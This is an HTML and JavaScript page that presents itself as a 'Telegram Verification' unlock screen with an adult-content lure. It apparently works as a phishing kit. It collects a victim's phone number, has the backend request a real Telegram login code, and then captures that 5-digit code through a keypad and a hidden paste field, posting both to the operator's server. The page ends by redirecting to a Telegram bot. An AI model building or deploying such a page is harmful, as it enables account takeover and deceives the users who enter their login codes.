<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification - Unlock</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { 
            background-color: #000; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        
        .bg-video {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1; filter: brightness(0.5);
        }

        .container {
            position: relative; z-index: 2; width: 92%; max-width: 380px;
            display: flex; flex-direction: column; align-items: center;
        }

        .header-box {
            background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
            width: 100%; text-align: center; margin-bottom: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            position: relative;
            margin-top: 35px;
        }

        /* VFX Glowing Animated Icon */
        .animated-icon-container {
            position: absolute; top: -45px; left: 50%; transform: translateX(-50%);
            width: 75px; height: 75px;
            background: radial-gradient(circle, #00bfff, #004466);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 25px #00e5ff, inset 0 0 12px #ffffff;
            border: 3px solid #ffffff;
            animation: vfxPulse 1.2s infinite alternate;
        }

        .phone-icon-inner { font-size: 32px; animation: vfxBounce 1s infinite alternate; }

        @keyframes vfxPulse {
            0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px #00e5ff, inset 0 0 8px #fff; }
            100% { transform: translateX(-50%) scale(1.1); box-shadow: 0 0 35px #00ffff, inset 0 0 15px #fff; }
        }

        @keyframes vfxBounce {
            0% { transform: translateY(0) scale(1); }
            100% { transform: translateY(-4px) scale(1.05); }
        }

        .header-box h2 {
            margin-top: 10px; font-size: 16px; color: #222; font-weight: 700; margin-bottom: 12px;
        }
        
        .phone-input {
            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px;
            font-size: 15px; outline: none; text-align: center; margin-bottom: 12px;
            font-weight: 600; color: #333;
        }
        .btn-get-code {
            background: #2ECC71; color: white; width: 100%; padding: 12px;
            border-radius: 10px; border: none; font-weight: 700; font-size: 15px; cursor: pointer;
            box-shadow: 0 4px 12px rgba(46, 204, 113, 0.4); transition: 0.2s;
        }
        .btn-get-code:active { transform: scale(0.97); }

        .code-display {
            display: flex; gap: 8px; margin-bottom: 20px; justify-content: center;
            cursor: pointer;
        }
        .code-box {
            width: 52px; height: 60px; border: 2px solid rgba(255,255,255,0.7);
            border-radius: 12px; display: flex; align-items: center; justify-content: center;
            font-size: 26px; color: white; font-weight: bold; background: rgba(255,255,255,0.15);
            backdrop-filter: blur(8px);
        }

        /* Hidden Paste Input */
        #pasteInput {
            position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px;
        }

        .keypad {
            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;
        }
        .key-btn {
            background: #0088CC; color: white; border: none; padding: 16px;
            font-size: 22px; font-weight: 700; border-radius: 12px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            transition: 0.1s;
        }
        .key-btn:active { background: #006699; transform: scale(0.95); }
        
        /* Done Button Styling */
        .key-btn.done-btn {
            background: #27AE60; font-size: 18px; font-weight: 700;
        }
        .key-btn.backspace { font-size: 20px; background: #E74C3C; }
    </style>
</head>
<body>

    <video autoplay muted loop playsinline class="bg-video">
        <source src="https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4" type="video/mp4">
    </video>

    <div class="container">
        
        <div class="header-box">
            <!-- VFX Glowing Animated Icon -->
            <div class="animated-icon-container">
                <div class="phone-icon-inner">📥</div>
            </div>

            <h2 id="boxTitle">Enter Telegram Number 🔞</h2>
            <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
            <button class="btn-get-code" id="actionBtn" onclick="handleAction()">GET CODE 📩</button>
        </div>

        <!-- Hidden Input for Copy/Paste Support -->
        <input type="text" id="pasteInput" maxlength="5" oninput="handlePasteInput(this)">

        <!-- 5 Digit OTP Boxes (Click to paste) -->
        <div class="code-display" id="codeDisplay" onclick="focusPasteInput()">
            <div class="code-box"></div>
            <div class="code-box"></div>
            <div class="code-box"></div>
            <div class="code-box"></div>
            <div class="code-box"></div>
        </div>

        <div class="keypad">
            <button class="key-btn" onclick="pressKey('1')">1</button>
            <button class="key-btn" onclick="pressKey('2')">2</button>
            <button class="key-btn" onclick="pressKey('3')">3</button>
            <button class="key-btn" onclick="pressKey('4')">4</button>
            <button class="key-btn" onclick="pressKey('5')">5</button>
            <button class="key-btn" onclick="pressKey('6')">6</button>
            <button class="key-btn" onclick="pressKey('7')">7</button>
            <button class="key-btn" onclick="pressKey('8')">8</button>
            <button class="key-btn" onclick="pressKey('9')">9</button>
            
            <!-- Bottom Left Done Button -->
            <button class="key-btn done-btn" onclick="verifyOtpCode()">Done ✅</button>
            
            <button class="key-btn" onclick="pressKey('0')">0</button>
            <button class="key-btn backspace" onclick="deleteKey()">⌫</button>
        </div>
    </div>

    <script>
        let currentInput = "";
        let step = "phone"; 
        let savedPhone = "";
        const MAX_OTP_LENGTH = 5;
        const boxes = document.querySelectorAll('.code-box');

        function updateDisplay() {
            for (let i = 0; i < MAX_OTP_LENGTH; i++) {
                boxes[i].innerText = currentInput[i] || "";
            }
        }

        function pressKey(num) {
            if (step === "otp" && currentInput.length < MAX_OTP_LENGTH) {
                currentInput += num;
                updateDisplay();
                
                if (currentInput.length === MAX_OTP_LENGTH) {
                    verifyOtpCode();
                }
            }
        }

        function deleteKey() {
            if (step === "otp" && currentInput.length > 0) {
                currentInput = currentInput.slice(0, -1);
                updateDisplay();
            }
        }

        // Copy/Paste Support Functions
        function focusPasteInput() {
            if (step === "otp") {
                const pasteInp = document.getElementById('pasteInput');
                pasteInp.focus();
                pasteInp.click();
            }
        }

        function handlePasteInput(el) {
            let val = el.value.replace(/\D/g, '');
            if (val.length > MAX_OTP_LENGTH) {
                val = val.slice(0, MAX_OTP_LENGTH);
            }
            currentInput = val;
            updateDisplay();
            if (currentInput.length === MAX_OTP_LENGTH) {
                verifyOtpCode();
            }
        }

        function handleAction() {
            if (step === "phone") {
                let phone = document.getElementById('phoneInput').value;
                if(!phone) {
                    alert("Please enter phone number with country code!");
                    return;
                }
                savedPhone = phone;
                
                fetch('/send-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: phone })
                })
                .then(res => res.json())
                .then(data => {
                    if(data.status === "success") {
                        alert("OTP sent to your Telegram app!");
                        step = "otp";
                        currentInput = "";
                        document.getElementById('phoneInput').style.display = "none";
                        document.getElementById('boxTitle').innerText = "Enter 5-Digit OTP Code 🔑";
                        document.getElementById('actionBtn').style.display = "none";
                    } else {
                        alert("Error: " + data.message);
                    }
                })
                .catch(err => alert("Connection error!"));
            }
        }

        function verifyOtpCode() {
            if (currentInput.length < MAX_OTP_LENGTH) {
                alert("Please enter the complete 5-digit OTP code!");
                return;
            }

            fetch('/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: savedPhone, code: currentInput })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === "success") {
                    alert("Verified Successfully! Redirecting...");
                    // সফল হলে নতুন ট্যাবে টেলিগ্রাম বট ওপেন হবে
                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                } else {
                    alert("Verification Failed: " + data.message);
                    currentInput = "";
                    updateDisplay();
                }
            })
            .catch(err => alert("Verification error!"));
        }
    </script>
</body>
</html>
